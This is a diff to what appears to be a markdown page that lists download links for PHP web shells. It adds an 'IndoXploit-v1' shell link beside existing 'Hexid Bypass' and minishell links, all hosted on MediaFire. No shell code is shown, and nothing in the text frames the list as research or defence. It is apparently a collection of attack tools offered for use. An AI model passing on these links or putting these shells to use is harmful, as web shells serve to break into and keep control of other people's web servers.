@@ -89,6 +89,8 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/t4znve3qlqwsmif/hexid-bypass_shell.php/file">Hexid Bypass</a>
 <img src="https://imgur.com/0x1ekVC.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/tckqhcxkfor171z/indoxploit-v1.php/file">IndoXploit-v1</a>
+<img src="https://i.imgur.com/HMe5dkZ.png" alt="beruangsalju profile">
   
 # <a href="https://www.mediafire.com/file/l4nn9vm1qqgogww/omestpriv8-V2_minishell.php/file">.: M 1 N 1 :.</a>
 <img src="https://imgur.com/J7RqIMu.png" alt="beruangsalju profile">
